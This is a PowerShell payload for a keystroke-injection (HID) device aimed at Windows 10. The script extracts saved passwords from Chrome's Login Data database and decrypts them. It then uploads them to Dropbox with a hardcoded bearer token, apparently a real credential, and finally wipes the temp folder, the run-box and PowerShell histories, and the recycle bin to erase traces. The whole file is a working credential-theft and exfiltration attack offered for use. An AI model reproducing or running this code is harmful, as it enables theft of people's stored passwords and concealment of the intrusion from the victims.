#########################################################################################################
#                                                               |                                       #
# Title        : Browser-Passwords-Dropbox-Exfiltration         |   ____ _____   ______                 #
# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
# Mode         : HID                                            |                        |_|    |___/   #
# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
#                                                               |                                       # 
#########################################################################################################

<#
.SYNOPSIS
	This script exfiltrates credentials from the browser via Dropbox.
.DESCRIPTION 
	Checkes and saves the credentials from the Chrome browser, then connects to Dropbox and uploads
    the file containing all of the loot.
.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
#>

$DropBoxAccessToken = "sl.u.AGQehDLrFnnogu4yClpxGvX-yFvpD1Ym8oVxxPrSJrGE-zNhsE3_PS7Em2zK72KySFfoBwFX33RsNi2gOBbrcN9wGOT7gSdgHNOixW_AmQ-UcfUvBw1peNIs9ROnD5nKl-FdbUOeR5NJO0gIakPBml--RnsStOBAIs7KChKfczPIES7mKsgFLV9k55rO_04i6ZlnxCQgC-b0Rut55ip_ALidhTW7syr5KwRmi01o6bHP2JWjJ9dREig9l3jve1naji-SfSweBoSJjFVsBx-8dbyIFVj0mrbzwxl3O41v-B6FVhaADJMN1u0RsDJMHMXzcKRxcDmLOvWSJvB033Bc5okLjU5p82HHusf9X5KuGGahlYaE5yUcOlD-1O6oEtPyyIgw15a9QGxgulzRoF22QYDbvYtaMIIftj_FrRd4JWE9AjEi5qXw9Bj9NTKrVZ6xxKePpuVDS97fjG0Hl7WRcZuS4EzxTymGaMcBK1a8UuIDhxuyCRUuYoPCasQAtCDrRlvDoi0bLGCHEtqlHDsW56wSTtbvH7JzOHmzJcdGZszUXkDZRk7QN1BBre41-uf1fbsmF03Pf9rWis7Gdy7S0w0C72XXYnAD77G6cF-dcxk2YKeqNWW5-srAXqOZdWBcNmuWkNtKocrkwQ7QViVGkPcN9sQWuNzJcHkXVs9hZC_8T4RYsFlNkFbmmeZj7d3az_NdyOOOlVONYb6jpS13L6qtfmgMdFBILxGvrNEiYtOr80Yd0dsOXx2Do0W-saOaeDg9vLk3MQ0VXPUTBt5BH151ySbEPmr9--uKJ84Yl5F-GH-Ds_Hun216ao6Hp96Gzpooh3sMGzq4cU1AhgZJwvpEZvLtLfWIVaQ4LiQb0JyExobpyBhLtAGDLygptezwWsvgGSC9WOBjGxm8rKp1iHvZfQ-w5VDa3RFajwJctywCqT7Cj5HcpWyXAaBpe42V15HXKtZxwlNgWOkXwRER0rqClZRpXlFkkhOzU92BZL0mxcNPa2anVX2hU7jcmLtqbTuCCQK2xZQKftiIKc5cfmV6dJ11Jx6Dj3-7xVc5xV2spdhalWUhCwHo_o7UiMlC4qLpLBHytzF6BX58_Ux4Q_iOqZfQVnQTNcwBrLMJgJTEa5BuJJeQADO7wfuHtdkwo9CqjCh3KuZjPqeWj159BdN1dRwdeqsO2PGSKscmL2hISbbJoihvFDi5QgmFtFGv8agAfhvzBOguT1q7vxQRLY4RfjOqTPYKO1UMy8bzrcyj8UrzWFFhw7odI4jkMgj2d2h44TstDjaodHZn0-OAvTM6vWK4Ee8gL22dOtSUle5zvNjf_qz5ymQ8qkHKpgWL_47rPMAK5DHB1sMU_mzDyHP4HXnnSt_XszK9QB1ZKcZg9m4ZR5NFJd-h17pY321lQ2QfF7HlLDZiwM3h1t0Ct32dCxnIujgRPRnSQdvMZR5h2Vp0FNkX3P30XURtzca_0fA"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#Stage 1 Obtain the credentials from the Chrome browsers User Data folder

#First we Kill Chrome just to be safe
Stop-Process -Name Chrome

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
#After Decrypting the contents of the files, save them to a file in the temp folder.

echo $l >> $env:TMP\$FileName

#Start Chrome again

$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

#Stage 2 Upload them to Dropbox

<#
.NOTES 
	This is to upload your files to dropbox
#>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers


#Stage 3 Cleanup Traces

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
